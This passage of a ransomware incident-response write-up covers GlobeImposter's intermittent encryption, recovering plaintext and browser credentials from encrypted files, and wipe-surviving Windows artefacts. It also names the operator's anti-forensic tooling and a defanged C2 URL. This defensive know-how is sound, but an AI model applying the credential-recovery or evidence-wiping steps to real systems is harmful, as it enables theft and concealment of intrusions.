Alongside the ciphertext, the encryptor drops a **zero-byte file whose name is the victim identifier** — 64 hex characters, SHA-256-length, unique per campaign — into `C:\Users\Public\`, three milliseconds after the encryptor process closed and *before* any file was renamed. The same value is embedded in every ransom note. It is the operator's out-of-band victim key.

### 7.4 The second recovery frontier: every small file is half plaintext

The 2.5 MiB head/tail model describes a VMDK-sized target. Ordinary Windows files — registry hives, credential stores, config files, logs, browser databases — are almost always **under 5 MiB**, so the head and tail regions *overlap* and the whole file falls inside the pattern:

| File size | Behaviour | Plaintext recoverable |
|---|---|---|
| ≤ 8 KiB | fully encrypted, one block | 0 % |
| 8 KiB – ~5 MiB | 8 KiB on / 8 KiB off across the **whole file** | **~50 %**, every odd block |
| > 5 MiB | 2.5 MiB damaged at each end, middle intact | 99 %+ |

This changes what "encrypted" means for thousands of files in an estate. Half the bytes of every registry hive, credential store and log the ransomware touched are on disk in the clear. Whether that is *useful* depends on whether the specific bytes you need landed on an odd 8 KiB block — but for structured formats it very often is, because those formats are page-oriented and a single surviving page is parsable in isolation. SQLite B-tree leaf pages. ESE database pages. Bencode records. XML and JSON fragments.

Three concrete results from this engagement:

| Encrypted file | Size | Surviving plaintext | Outcome |
|---|---|---|---|
| Firefox `key4.db` (master key store) | 295,856 B | 147,456 B on 18 odd blocks | **40 of 40 credentials decrypted** — the `metaData` globalSalt row and the `nssPrivate` A11 blob both landed on intact pages |
| uTorrent `resume.dat` | 35,328 B | 16,384 B on 2 blocks | full torrent metadata, source URLs, trackers, 43 GiB download history, completion dates |
| uTorrent `settings.dat` | 21,888 B | 8,192 B on 1 block | client config, geoip locale, 96 lifetime launches |

The browser's encrypted master-key database was recovered *from its own ciphertext* and used to decrypt exactly the credential set the operator had stolen that morning. I enjoy that symmetry more than is professional.

Generalised method: strip the trailer, take every odd 8 KiB block starting at offset 8192, and parse the surviving fragments as whatever the format was. For SQLite this means walking pages independently of the file header. For ESE hives, the same. Do not expect a valid file — expect valid *records*.

**The "97 % of virtual disks recovered" figure therefore understates the recoverable data.** Thousands of individual guest files yield partial-to-complete content by the same arithmetic, with no key involved.

### 7.5 Measuring a cipher you do not have

The encryptor binary was never recovered — deleted onto a thin-provisioned, TRIM-backed volume, which zeroes reclaimed blocks within days. So the cipher was characterised *behaviourally*, using a known-plaintext corpus that turned up by accident.

The acquisition store held a 126 MB VMware guest swap file, encrypted. It proved to be **entirely zero-filled before encryption** — all 320 skipped blocks and the whole 126,877,696-byte intact middle contain not one non-zero byte. The guest never paged. As a memory artefact it is worthless. As a known-plaintext corpus it is 320 encrypted 8 KiB blocks whose plaintext is provably all zeros.

| Test | Result |
| ---- | ------ |
| 320 blocks of `E(0×8192)` within one file | **320 distinct ciphertexts**, zero repeats |
| Byte histogram, block 0 | all 256 values present, max frequency 54 — flat |
| Internal period, 16–4096 B | none detected |
| `block₀ ⊕ block₁` | 8,164 / 8,192 bytes non-zero |
| `block₀ ⊕ block₃₁₉` | 8,151 / 8,192 bytes non-zero |
| Cross-file, swap vs six other samples | **0 shared ciphertext blocks** |

Identical plaintext at 320 different offsets producing 320 different ciphertexts means the keystream is a function of **file position and of something per-file** — key or IV seed. Flat distribution, no repeats, no internal period, no cross-file reuse. That is the signature of **AES in CTR mode, or CBC with an offset-derived IV**.

Conclusion: **no keystream reuse, no key-recovery shortcut.** Recovery here depended entirely on the intermittent-encryption geometry and never on a cryptographic weakness. If this family ever ships a variant that encrypts contiguously, none of the above works.

---

## 8. Two claims that did not survive the evidence

The retractions are the section I would want to read in someone else's writeup, so here are mine.

### 8.1 "RSA-2048 via statically-linked mbedTLS, no static AES"

An earlier draft asserted both. Neither came from the binary that ran on this host — that binary does not exist any more. They came from a static-analysis pass over **five same-family samples downloaded from a public malware repository**, all 54,272–55,296 bytes, all sharing one imphash and a byte-identical 12,680-byte code region from the entry point. That analysis reported mbedTLS strings, an mbedTLS bignum small-primes table, SHA-256 round constants, and no AES S-box in any sample.

Why the retraction stands: those samples and the scripts that analysed them lived in transient scratch and **were not preserved in the evidence store**. There is no reproducible artefact backing either claim. And they are not our build in any case — they are same-family siblings whose per-campaign key material lives in exactly the regions that vary.

What survives is §7.5, which is measured from evidence still in the store. Note carefully that flat, non-repeating, position-dependent blocks are **evidence for a stream-like construction, not evidence for the absence of AES** — AES-CTR looks exactly like this. The trailer is consistent with RSA-2048 *by length alone*; the library that produced it is unknown from primary sources.

### 8.2 The miner that probably wasn't

Same discipline, different artefact. Four cryptominer installations were tracked on this host, the earliest **thirteen days after the server was built**, two years before the ransomware. That looks like a long-running compromise.

The earliest one was fully recovered, because it sat outside the operator's staging tree, and it is the **unmodified official XMRig release** with:

- a **stock, unedited `config.json`** whose pool user is the literal placeholder string shipped in the release,
- `benchmark_1M.cmd` and `benchmark_10M.cmd` — XMRig's CPU benchmark mode, which mines to nobody,
- a `start.cmd` of exactly the stock size, no wallet arguments,
- **no persistence of any kind** — no service, no Run key, no scheduled task, no IFEO entry.

A pristine, unconfigured XMRig copied to `C:\TMP\` two weeks after a server is built reads at least as plausibly as **an administrator benchmarking new hardware** as it does an attacker install. The two *later* miner installs — in folders named "New folder" in Russian, matching the operator's naming convention elsewhere — are the ones that fit operator behaviour, and both of those folders were deleted and TRIM-zeroed, so their configs and wallets are gone.

Defensible statement: an unconfigured miner arrived on day 13; two more appeared later in operator-named folders; productive mining is plausible but unproven; **no wallet was recovered from any of them.**

"Seventeen months of cryptomining" would have been a much better headline and a worse finding.

---

## 9. Forensics under a total event-log wipe

A field guide to what saved this investigation, with the semantics that matter.

**USN change journal (`$UsnJrnl:$J`)** — 41.7 MB, 404,202 records. Coverage happened to begin at 19:46 on the attack day, so it caught the entire evening but *not* the 04:27 toolkit drop, whose timing had to come from MFT `$STANDARD_INFORMATION` instead. Records file reference number, parent reference, timestamp and reason flags for every change. Does **not** record acting process or user — that is the single biggest limitation, and it is why so many findings above are corroborated from a second artefact. Reason flags worth knowing: `BASIC` = `SetFileTime()` (timestomp indicator), `OVR`/`EXT`/`TRC` = overwrite/extend/truncate of `$DATA`.

**MFT `SI` vs `FN`** — covered in §6.1. The workhorse of anti-anti-forensics.

**MFT-resident `$DATA`** — small files live inline in their record. Six of seven wipe scripts came back this way, byte-accurate.

**RDP client-side bitmap cache** — `Cache000N.bin` in the user profile's Terminal Server Client directory. The wipe script cleared the *registry* RDP history and missed the *on-disk* cache entirely. These were live, unencrypted, allocated files. They yielded the mount script, the credential-extraction script open in ISE with its comment banner readable, and mimikatz output files open in Notepad.

Mechanics, since they bite: tiles are 64×64 BGRA, stored **top-down** (my first render came out vertically flipped), and they appear in **cache order, not screen order** — adjacency on a contact sheet carries no positional meaning whatsoever. Do not reconstruct a screen layout from tile adjacency; reconstruct *text* from tile content and accept that word order across tiles is a guess. The standard tool for this is `bmc-tools`; I ended up writing a pure-Python parser with a stdlib-`zlib` PNG encoder because the analysis host had no PIL or numpy.

**UserAssist** (`NTUSER.DAT`) — GUI-launched programs with run count, **foreground focus count and total focus time in milliseconds**. No other artefact gives you *duration*. Value names are ROT13-encoded; the structure is 72 bytes with run count at offset 4, focus count at 8, focus time at 12, last-execution FILETIME at 60.

Two entries reframed the engagement:

- The network scanner: **43 focus events, 38.7 minutes of cumulative foreground time.** My first draft had listed it as staged inventory. It was sustained, interactive, estate-wide reconnaissance by a human being.
- Outbound RDP: **4 runs, 29 minutes of cumulative focus.** The operator used this box as a jump host and went somewhere. No other machine in the estate was ever triaged, so the true scope of lateral movement is not "small" — it is **unmeasured**. That became the largest open question in the whole engagement.

Critical semantics: **UserAssist records only the *most recent* execution timestamp.** A run count above 1 means earlier executions exist and are undated. Cumulative focus figures are across all runs and are independent of that timestamp. Reporting "netscan ran at 04:31:13" as *the* scan time would be wrong; reporting "the operator spent 38.7 minutes in a scanner across 43 sessions" is right.

**Amcache** — inventory of executables with a SHA-1 per entry. Two semantics people get wrong: the event time is the registry key's **lastwrite**, set when the inventory service registers a change, not the file's execution time; and Amcache reflects **disk state at inventory time**, so a rebuilt hive means the *absence* of an attacker binary proves nothing. Here it placed the anti-forensic LOLBins (`vssadmin`, `wmic`, `bcdedit`, `attrib`, `timeout`, `net1`) at inventory-cycle precision, corroborating the USN's script timings from a second source, and it resolved the `systray.exe` false lead.

**PCA** (`C:\Windows\AppCompat\pca\PcaGeneralDb0.txt`) — the Program Compatibility Assistant execution database. UTF-16LE, pipe-delimited: `timestamp|resolver|path|product|vendor|version|program_id|message`. Underused, and it survived the wipe. A companion file independently caught a backup-product process the next morning.

**SAM `F` records** — per-account binary structures with last logon, last logoff, password-set time, account expiry, last failed logon, RID, ACB flags, failed count and login count at fixed offsets. Caveat learned the hard way: the **login-count field is unreliable on modern Windows** and reads zero even when last-logon is populated. Trust the FILETIME, not the counter.

**`RunMRU`** — what was typed into Win+R. Entries cannot be individually timestamped; you get an `MRUList` ordering string and the key's lastwrite. In this case it produced five candidate internal hosts for how the toolkit arrived, including one that was typed three times, `ping`ed, and hosts a share whose name translates to *"for writing 500"*. A named writable share is a plausible channel for both kit delivery and staging. It also, honestly, contained entries from the responder window — so ordering gives you a *sequence*, not attribution.

**SRUM** — resource usage per application. Useful for establishing that a binary executed and for volume-level device paths. But note: the per-application **Network Data Usage table does not exist on Windows Server**. The replacement is per-interface and its byte columns did not decode. That is why the exfiltration volume question routes entirely to the network side.

**Runlist recovery — the one primitive that does not work here.** Walking a deleted MFT record's cluster runlist assumes those clusters still hold the old data. **This volume is thin-provisioned with TRIM**: the guest issues UNMAP on delete, VMFS reclaims the blocks, and the content reads back as zeros or as whatever now occupies those clusters. It fails *silently and plausibly* — you get a file of exactly the expected size, from a record with the right filename, and sometimes with a valid-looking PE header on the front. All 117 files extracted this way from this volume were re-checked against a published 87-hash IOC list: **zero matched**, and of the 61 PE candidates **60 failed at `MZ` magic**. One of them looked convincing enough to nearly become a published IOC — it was a Windows resource-only DLL that had been allocated the clusters afterwards.

The gate applied to anything runlist-extracted since: `MZ` magic **and** a non-empty `.text` section **and** a non-zero import table **and** `AddressOfEntryPoint > 0` **and**, where the tool is public, a vendor hash match. Everything that fails is quarantined as documentation of the failure boundary, not retained as evidence.

**Zero attacker binaries were recovered from this host.** Everything in §3 is filename-and-metadata reconstruction from the MFT and USN, and it is labelled as such. Two primitives are *not* affected and the distinction is worth internalising: **MFT-resident recovery is byte-accurate** (the wipe scripts came out of their records' inline `$DATA`, one hash-matching a published sample byte-for-byte), and **live allocated files are fine** (the bitmap caches and the browser key store were never deleted).

**Negative results, recorded so nobody mistakes them for unexplored leads:**

| Artefact | Result |
| -------- | ------ |
| Guest swap file, 126 MB | entirely zero-filled before encryption — no memory content exists to recover |
| Edge browser history | `urls` table: **0 rows** |
| Edge login data, 604 files across 4 snapshots | `logins` table: **0 rows** |
| A 64 KB file named like a user hive | **not a hive** — zero non-zero bytes, invalid `REGF` header, and no such user account exists. Another TRIM-zeroed runlist extraction sitting unlabelled beside five genuine hives |

That last row is the runlist failure mode again, waiting to generate a finding about an account that never existed. Label your quarantined extractions.

---

## 10. Attribution: commodity kit, one verified hash, one unique file

The kit matches a published threat-intelligence IOC list for a Phobos-family operator: 87 filenames with SHA-1s. How much of that correspondence is *verified*?

- **One file** hash-matched byte-for-byte: a wipe script recovered from its MFT-resident `$DATA`.
- **One content-level match**: both `bcdedit` lines in the recovered VSS-destruction script match the published sequence exactly, including the `bootstatuspolicy ignoreallfailures` line.
- **Everything else is filename-and-behaviour correspondence.** Eighteen kit files could never be hash-compared because their bytes were never recovered (see §9 on runlist recovery).

So the shared-kit conclusion rests on two verified files plus strong structural correspondence — not eighteen hash matches. Stating it that way costs nothing and is the difference between an assessment and a claim.

The ransomware *family* differs from the published report's (that one is Phobos lineage; this payload is GlobeImposter), but family-switching between engagements is normal affiliate behaviour. The **operator profile** is identical: the same batch and VBS scripts, the same NirSoft credential dumpers, the same Defender-kill approach, the same `vssadmin`/`wmic`/`wbadmin` sequence.

### 10.1 The encryption geometry is the discriminator

This payload is *not* Phobos, and the proof is arithmetic rather than assertion. Published Phobos analysis describes a **1.5 MB** size threshold: files below it are encrypted **in full**; files above it get scattered blocks through the body, **with the list of block offsets written into the file metadata** alongside the wrapped key.

| | Phobos (published) | This payload (measured) |
|---|---|---|
| Size threshold | 1.5 MB | **~5 MiB** |
| Below threshold | **fully** encrypted | 8 KiB on / 8 KiB off — **~50 % survives** |
| Above threshold | scattered blocks, positions vary | **fixed** 2.5 MiB head + 2.5 MiB tail |
| Block map | **stored in metadata** | **none** — offsets are deterministic |
| Asymmetric | RSA-1024, hardcoded | 256-byte wrapped key by length; library unknown[^crypto] |
| Symmetric | AES-256 | position-dependent keystream; construction unconfirmed[^crypto] |

[^crypto]: The last two rows are exactly the claims retracted in §8.1. They are shown as unconfirmed rather than removed because the *geometry* rows above them are measured, and the contrast between block-map-in-metadata and deterministic-offsets is the whole argument.

**That difference is why recovery worked.** Phobos must record where it wrote, because its offsets vary. This encryptor writes at fixed, predictable offsets and records nothing — so every intact block can be located arithmetically without the key. And had this been Phobos, every file under 1.5 MB would have been **fully** encrypted: the browser key store, the registry hives, the client state files. The 40 credentials would have been unrecoverable and §7.4 would not exist.

A different affiliate's build choice, made for throughput, is the sole reason this incident had a good outcome.

### 10.2 A named public campaign matches

A published vendor analysis describes the same operator distributing GlobeImposter alongside another ransomware family via RDP-obtained access. Overlaps with this incident:

1. ransom-note filename **byte-identical** to ours,
2. kit staged in the **`Music\` folder** — same parent-folder convention, different subfolder naming,
3. **XMRig deployed alongside the ransomware**, matching the miner installs here,
4. same tool families — port scanner, mimikatz, NirSoft credential recovery, share scanners,
5. same anti-forensics — batch scripts deleting VSS, event logs and RDP history,
6. the campaign's ransom-note addresses appear on a government advisory's IOC list for the other family, and the analysis names a C2 endpoint (`hxxp://46.148.235[.]114/cmd.php`).

GlobeImposter uses a **per-campaign parameterised file extension** — that report's variant differs from ours by one word. Same family, same operator profile, different campaign build. Notably, *this* operator's traffic to that named C2 left no trace on the host: no matching string anywhere on the volume. C2 infrastructure is per-affiliate, not per-kit.

### 10.3 One file in the kit is unique

Of every script in this operator's toolkit, exactly one has **no public sample anywhere** and does not appear in the published IOC list: an 8 KB batch file dropped at the volume root, timestomped to 2023, executed, and deleted within three minutes. Either it is operator-customised — a personalised launcher pointing at their specific payload location — or it comes from a rare kit variant.

Its exact bytes are permanently unrecoverable through any local or public avenue. It is also, irritatingly, the one file with a genuine timeline anomaly: UserAssist records it executing **eight minutes after** the USN journal records it deleted. Either the deletion attribution is wrong, or the file was re-created, or the UserAssist entry refers to a same-named file elsewhere. Unresolved.

---

## 11. What could not be answered, and where the answers live

A note on scoping before the table: **only one host was ever examined.** Twenty-nine minutes of outbound RDP and thirty-nine minutes of estate-wide scanning establish that the operator went further. The hypervisors, the rebuilt vCenter, the domain controller, the application server, and the five hosts named in `RunMRU` were never triaged. An incident report that examines one machine out of an estate is a *starting* document.

Being explicit about the rest matters more than the findings:

| Question | Why the host cannot answer it | Where it lives |
| --- | --- | --- |
| **Inbound access path** | 137 event channels cleared; vCenter rebuilt ten days later; modern ESXi does not log SSH source addresses | perimeter firewall / log analyser flow data |
| **Exfiltration volume and destination** | the per-application network table does not exist on Windows Server; the replacement did not decode | flow logs — **and the unexamined blob-storage client profile on the box** |
| **Miner wallet / pool** | the recovered config is a stock template; the configured copies were deleted and TRIM-zeroed | outbound flows to pool ports, DNS resolution logs |
| **Operator C2** | zero artefacts on the volume | DNS logs, flow logs |
| **How the toolkit arrived** | no `Zone.Identifier`, no RDP-clipboard path, no USB evidence; SMB/UNC is the only surviving hypothesis | the five hosts in `RunMRU`, their SMB access logs, DC audit logs |
| **When the host was first compromised** | no surviving log predates the wipe; the artefacts that would date it are ambiguous | firewall archives; a hypervisor SSH log older than the incident |
| **What else the operator reached** | **only one host was examined** | triage of the rest of the estate |

One log source was never checked and might still matter: at least one hypervisor retains an SSH authentication log going back two years, and it had only ever been searched for the attack month. It sits entirely outside everything the operator wiped.

And the methodological confession, because it is the largest single risk in the engagement: the NTFS, USN, bitmap-cache and registry work was done with roughly **141 bespoke, unvalidated scripts**. No commercial or peer-reviewed forensic suite was involved at any point. Every finding above that matters should be reproducible with an independent tool, and until it is, that is the honest caveat to attach to all of it.

---

## 12. Takeaways

**If you defend virtualised infrastructure:**

- A hypervisor estate can be encrypted with **zero hypervisor-side execution**. If your ESXi detection strategy assumes a Linux encryptor, `esxcli` calls, or a VM power-off loop, this attack walks past all three.
- **Backup infrastructure is credential infrastructure.** A backup server's config database holds decryptable credentials for every hypervisor, guest, SQL instance and cloud repository it touches, and the public tooling to extract them is two kilobytes of PowerShell. Model compromise of the backup server as compromise of everything it backs up — because that is what it is.
- **ESXi SSH off by default.** Of every control in this post, that is the one that stops this specific attack outright.
- **One password family across vCenter, eleven hosts, the routers and the cloud tenant** means the browser password store *is* the estate. Eight minutes of harvesting produced everything.
- **Never let a server double as a workstation.** The torrent client, the cracked software and the saved passwords were all on the box that mounted every datastore.
- **The off-site repository is what saved this one.** It was active ninety minutes before the attack and the ransomware could not reach it. Every other control failed.

**If you respond to these:**

- **Assume intermittent encryption. Measure the pattern before you assume a disk is lost.** 97 % recovery here came from backup GPT headers, ext4 backup superblocks and NTFS backup boot sectors sitting outside a fixed blast radius, by pure geometry.
- **Then apply the same logic downward.** Half of every small encrypted file is plaintext. For page-oriented formats — SQLite, ESE, bencode — that is frequently the whole record you wanted.
- **When event logs are gone, the wipe kits are consistently incomplete.** USN, MFT SI-vs-FN, PCA, UserAssist, Amcache and the RDP bitmap cache all survived a deliberate seven-script wipe here and between them reconstructed a seventeen-hour session to the second.
- **Learn your artefacts' semantics, not just their locations.** UserAssist timestamps are *last* execution. Amcache times are inventory events. SRUM's device paths shift across time. SAM's login counter lies. Each of those nearly produced a wrong finding.
- **Do not trust runlist recovery on thin-provisioned TRIM storage.** It fails silently and plausibly. Gate every extraction structurally, and quarantine what fails.
- **Corroborate from a second artefact class before anything leaves your hands as an IOC.** One hash in this case would have been a Microsoft resource DLL.

**And on writing the report:**

Several claims in this engagement did not survive contact with primary evidence — a crypto analysis run against the wrong binaries, a "recovered" file that was a system DLL, a two-year cryptomining narrative that was probably a benchmark. Every one of them was *plausible*, and most of them made a better story than the truth.

Write the negative results down next to the findings. Write the retractions down next to the conclusions. Say "earliest candidate" when that is what you have, and "two verified files plus behavioural correspondence" when that is what the attribution rests on. A report that only lists what held up is a report nobody can calibrate — including you, six months later, when someone asks how firmly you actually know the thing you wrote.
